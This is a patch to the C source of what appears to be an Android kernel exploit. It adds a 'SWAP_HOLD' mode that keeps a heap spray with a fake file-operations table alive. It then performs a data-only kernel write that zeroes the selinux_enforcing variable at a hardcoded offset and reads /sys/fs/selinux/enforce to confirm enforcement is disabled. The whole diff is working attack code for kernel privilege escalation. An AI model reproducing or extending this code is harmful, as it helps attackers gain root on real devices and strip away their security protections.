@@ -523,6 +523,15 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
        * the killer; dies => system traffic through the swapped table. */
       pr_info("mode4 SWAP_NOCFI: skipping cfi stage\n");
       durable_stage("swap_nocfi_done");
+      if (env_flag("MODE4_SWAP_HOLD", 0)) {
+        pr_info("SWAP_HOLD: spray live fake_fops=%016zx pid=%d — not exiting\n",
+                fake_fops, getpid());
+        durable_stage("swap_hold");
+        fflush(stdout);
+        fsync(STDOUT_FILENO);
+        for (;;)
+          sleep(30);
+      }
       return 1;
     }
     pr_info("mode4 post-walk cfi stage (unconditional)\n");
@@ -1388,6 +1397,39 @@ int run_exploit(int argc, char **argv) {
     pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
             landed ? "POSITIVE store executes on-device"
                    : "NEGATIVE (walk miss / wrong alias / no write)");
+    /*
+     * SWAP_HOLD: waiter sleeps with spray live. N11/N12: opening the
+     * swapped ashmem node panics. Second walk is data-only SLIDE_ZERO
+     * into selinux_enforcing (same stack-stamp as the working oracle).
+     */
+    if (env_flag("MODE4_SWAP_HOLD", 0) && env_flag("MODE4_SLIDE_SWAP", 0)) {
+      uint64_t eoff = (active_offsets && active_offsets->off_selinux_enforcing)
+                          ? active_offsets->off_selinux_enforcing
+                          : 0x2A793C8ULL;
+      uintptr_t enf = data_addr(KIMAGE_TEXT_BASE + eoff);
+      pr_info("HOLD ph2: SLIDE_ZERO selinux_enforcing=%016zx (no ashmem open)\n",
+              enf);
+      durable_stage("hold_zero_enf");
+      unsetenv("MODE4_SLIDE_SWAP");
+      unsetenv("MODE4_SWAP_HOLD");
+      setenv("MODE4_SLIDE_ZERO", "1", 1);
+      set_pselect_write_mode(enf, 0, 4);
+      pselect_child_node = 1;
+      run_main_route_threads();
+      char eb[8] = {0};
+      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+      if (efd >= 0) {
+        (void)read(efd, eb, 4);
+        close(efd);
+      }
+      pr_info("HOLD ph2: enforce_after=%.4s\n", eb);
+      live_sync_log("ENFORCE", eb);
+      durable_stage("hold_zero_enf_done");
+      fflush(stdout);
+      fsync(STDOUT_FILENO);
+      for (;;)
+        sleep(30);
+    }
     if (env_flag("MODE4_ROOT", 0) && boot_after[0]) {
       uint64_t rslide = slide_decode_from_bootid(boot_after);
       pr_info("ROOT ph2: slide=%016llx bootid=%s\n",
